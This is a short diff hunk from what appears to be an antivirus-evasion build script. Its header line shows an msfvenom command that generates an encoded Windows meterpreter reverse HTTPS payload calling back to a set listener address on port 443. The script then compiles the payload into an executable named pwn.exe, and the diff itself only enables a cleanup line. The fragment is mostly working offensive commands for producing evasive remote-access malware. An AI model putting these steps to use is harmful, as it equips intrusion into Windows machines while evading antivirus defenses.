@@ -12,4 +12,4 @@ msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe avet.c
 # cleanup
-#rm sc.txt && echo "" > defs.h
+rm sc.txt && echo "" > defs.h
